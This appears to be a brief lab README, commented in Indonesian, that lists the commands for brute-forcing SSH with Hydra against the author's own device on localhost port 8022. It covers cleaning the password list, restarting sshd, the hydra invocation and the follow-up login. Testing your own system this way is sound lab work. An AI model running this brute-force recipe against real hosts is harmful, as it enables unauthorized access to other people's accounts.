
# SSH-Brute-Force-Lab---Internal-Audit

COMMAND I USE
tools = hydra

# 1. Cek format passlist (ada \r)
cat -A passlist.txt

# 2. Bersihin passlist
sed -i 's/\r//g; s/ *$//g' passlist.txt

# 3. Reset service pas error
pkill sshd; rm hydra.restore; sshd; sleep 2

# 4. Eksekusi utama (low & slow biar stabil)
hydra -I -l u0_a2027 -P passlist.txt -s 8022 -t 2 -W 1 -V 127.0.0.1 ssh

# 5. Validasi akses
ssh -p 8022 u0_a2027@127.0.0.1
